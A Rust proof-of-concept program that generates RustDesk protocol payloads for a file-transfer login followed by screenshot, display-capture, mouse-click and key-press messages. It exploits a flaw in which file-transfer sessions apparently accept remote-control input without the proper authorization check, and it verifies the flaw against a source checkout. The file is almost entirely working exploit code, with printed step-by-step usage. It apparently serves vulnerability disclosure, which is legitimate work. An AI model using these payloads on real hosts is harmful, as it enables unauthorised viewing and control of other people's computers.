include!(concat!(env!("OUT_DIR"), "/protos/mod.rs"));

use anyhow::{bail, Context, Result};
use protobuf::{EnumOrUnknown, Message as _};
use sha2::{Digest, Sha256};
use std::{env, fs, path::{Path, PathBuf}};

use crate::message as proto;

fn main() -> Result<()> {
    let mut repo_root = None::<PathBuf>;
    let mut out_dir = env::current_dir()?.join("poc_out");
    let mut peer_id = "controlled-peer-id".to_owned();
    let mut my_id = "attacker-id".to_owned();
    let mut my_name = "filetransfer-control-poc".to_owned();
    let mut password = None::<String>;
    let mut salt = None::<String>;
    let mut challenge = None::<String>;

    let mut args = env::args().skip(1);
    while let Some(arg) = args.next() {
        match arg.as_str() {
            "--repo-root" => repo_root = Some(PathBuf::from(next_arg(&mut args, "--repo-root")?)),
            "--out" => out_dir = PathBuf::from(next_arg(&mut args, "--out")?),
            "--peer-id" => peer_id = next_arg(&mut args, "--peer-id")?,
            "--my-id" => my_id = next_arg(&mut args, "--my-id")?,
            "--my-name" => my_name = next_arg(&mut args, "--my-name")?,
            "--password" => password = Some(next_arg(&mut args, "--password")?),
            "--salt" => salt = Some(next_arg(&mut args, "--salt")?),
            "--challenge" => challenge = Some(next_arg(&mut args, "--challenge")?),
            "--help" | "-h" => {
                print_help();
                return Ok(());
            }
            other => bail!("unknown argument: {other}"),
        }
    }

    let repo_root = match repo_root {
        Some(path) => path,
        None => find_repo_root()?,
    };
    verify_source_reachability(&repo_root)?;
    fs::create_dir_all(&out_dir).with_context(|| format!("create {}", out_dir.display()))?;

    let password_proof = match (password, salt, challenge) {
        (Some(password), Some(salt), Some(challenge)) => {
            Some(rustdesk_password_proof(&password, &salt, &challenge))
        }
        (None, None, None) => None,
        _ => bail!("--password, --salt, and --challenge must be supplied together"),
    };

    let payloads = [
        (
            "01_login_filetransfer.bin",
            login_filetransfer(&peer_id, &my_id, &my_name, password_proof.unwrap_or_default())?,
        ),
        ("02_screenshot_request.bin", screenshot_request()?),
        ("03_capture_display0.bin", capture_display0()?),
        ("04_mouse_left_click.bin", mouse_left_click()?),
        ("05_key_return_press.bin", key_return_press()?),
    ];

    for (name, bytes) in payloads {
        let path = out_dir.join(name);
        fs::write(&path, &bytes).with_context(|| format!("write {}", path.display()))?;
        println!("{name}: {} bytes, hex={}", bytes.len(), hex::encode(&bytes));
    }

    println!();
    println!("PoC payloads written to {}", out_dir.display());
    println!("Use only against a RustDesk host you own/control. The sequence is:");
    println!("1. complete the normal transport/key exchange and receive Hash(salt, challenge)");
    println!("2. send 01_login_filetransfer.bin with a valid password proof");
    println!("3. after LoginResponse success, send screenshot/capture/input payloads");
    println!("The source verifier confirmed this commit accepts these post-auth messages on a FileTransfer connection without rechecking AuthConnType::Remote.");
    Ok(())
}

fn next_arg(args: &mut impl Iterator<Item = String>, name: &str) -> Result<String> {
    args.next()
        .with_context(|| format!("missing value for {name}"))
}

fn print_help() {
    println!(
        "Usage: rustdesk_filetransfer_control_poc --repo-root <rustdesk> --out <dir> \\
         [--peer-id <id>] [--my-id <id>] [--my-name <name>] \\
         [--password <pw> --salt <salt> --challenge <challenge>]"
    );
}

fn find_repo_root() -> Result<PathBuf> {
    let mut dir = env::current_dir()?;
    loop {
        let candidate = dir.join("rustdesk").join("src").join("server").join("connection.rs");
        if candidate.exists() {
            return Ok(dir.join("rustdesk"));
        }
        if !dir.pop() {
            bail!("could not auto-locate rustdesk repo; pass --repo-root");
        }
    }
}

fn verify_source_reachability(repo_root: &Path) -> Result<()> {
    let connection = fs::read_to_string(repo_root.join("src/server/connection.rs"))
        .with_context(|| "read src/server/connection.rs")?;
    let ui_cm = fs::read_to_string(repo_root.join("src/ui_cm_interface.rs"))
        .with_context(|| "read src/ui_cm_interface.rs")?;

    require(&connection, "self.file_transfer = Some((ft.dir, ft.show_hidden));")?;
    require(&connection, "self.authorized = true;")?;
    require(&connection, "(1, AuthConnType::FileTransfer)")?;
    require(&connection, "if let Some((dir, show_hidden)) = self.file_transfer.clone()")?;
    require(&connection, "} else if self.terminal {")?;
    require(&connection, "Some(message::Union::MouseEvent(mut me))")?;
    require(&connection, "if self.peer_keyboard_enabled()")?;
    require(&connection, "Some(message::Union::KeyEvent(me))")?;
    require(&connection, "Some(message::Union::ScreenshotRequest(request))")?;
    require(&connection, "crate::video_service::set_take_screenshot(")?;
    require(&ui_cm, "allow_err!(client.tx.send(Data::Authorize));")?;

    let file_transfer_branch = connection
        .find("if let Some((dir, show_hidden)) = self.file_transfer.clone()")
        .context("file-transfer post-login branch not found")?;
    let terminal_branch = connection[file_transfer_branch..]
        .find("} else if self.terminal {")
        .context("terminal post-login branch not found after file-transfer branch")?
        + file_transfer_branch;
    let between = &connection[file_transfer_branch..terminal_branch];
    if between.contains("self.keyboard = false") {
        bail!("file-transfer branch appears to disable keyboard in this checkout");
    }
    Ok(())
}

fn require(haystack: &str, needle: &str) -> Result<()> {
    if haystack.contains(needle) {
        Ok(())
    } else {
        bail!("source reachability check failed, missing snippet: {needle:?}")
    }
}

fn rustdesk_password_proof(password: &str, salt: &str, challenge: &str) -> Vec<u8> {
    let mut h1 = Sha256::new();
    h1.update(password.as_bytes());
    h1.update(salt.as_bytes());
    let h1 = h1.finalize();

    let mut h2 = Sha256::new();
    h2.update(&h1);
    h2.update(challenge.as_bytes());
    h2.finalize().to_vec()
}

fn login_filetransfer(peer_id: &str, my_id: &str, my_name: &str, proof: Vec<u8>) -> Result<Vec<u8>> {
    let mut ft = proto::FileTransfer::new();
    ft.dir = String::new();
    ft.show_hidden = false;

    let mut lr = proto::LoginRequest::new();
    lr.username = peer_id.to_owned();
    lr.password = proof.into();
    lr.my_id = my_id.to_owned();
    lr.my_name = my_name.to_owned();
    lr.version = "1.4.3".to_owned();
    lr.my_platform = env::consts::OS.to_owned();
    lr.union = Some(proto::login_request::Union::FileTransfer(ft));

    let mut msg = proto::Message::new();
    msg.union = Some(proto::message::Union::LoginRequest(lr));
    Ok(msg.write_to_bytes()?)
}

fn screenshot_request() -> Result<Vec<u8>> {
    let mut req = proto::ScreenshotRequest::new();
    req.display = 0;
    req.sid = "poc-filetransfer-screenshot".to_owned();
    let mut msg = proto::Message::new();
    msg.union = Some(proto::message::Union::ScreenshotRequest(req));
    Ok(msg.write_to_bytes()?)
}

fn capture_display0() -> Result<Vec<u8>> {
    let mut cap = proto::CaptureDisplays::new();
    cap.set.push(0);
    let mut misc = proto::Misc::new();
    misc.union = Some(proto::misc::Union::CaptureDisplays(cap));
    let mut msg = proto::Message::new();
    msg.union = Some(proto::message::Union::Misc(misc));
    Ok(msg.write_to_bytes()?)
}

fn mouse_left_click() -> Result<Vec<u8>> {
    let mut mouse = proto::MouseEvent::new();
    mouse.mask = 1;
    mouse.x = 320;
    mouse.y = 240;
    let mut msg = proto::Message::new();
    msg.union = Some(proto::message::Union::MouseEvent(mouse));
    Ok(msg.write_to_bytes()?)
}

fn key_return_press() -> Result<Vec<u8>> {
    let mut key = proto::KeyEvent::new();
    key.press = true;
    key.union = Some(proto::key_event::Union::ControlKey(EnumOrUnknown::new(
        proto::ControlKey::Return,
    )));
    key.mode = EnumOrUnknown::new(proto::KeyboardMode::Map);
    let mut msg = proto::Message::new();
    msg.union = Some(proto::message::Union::KeyEvent(key));
    Ok(msg.write_to_bytes()?)
}
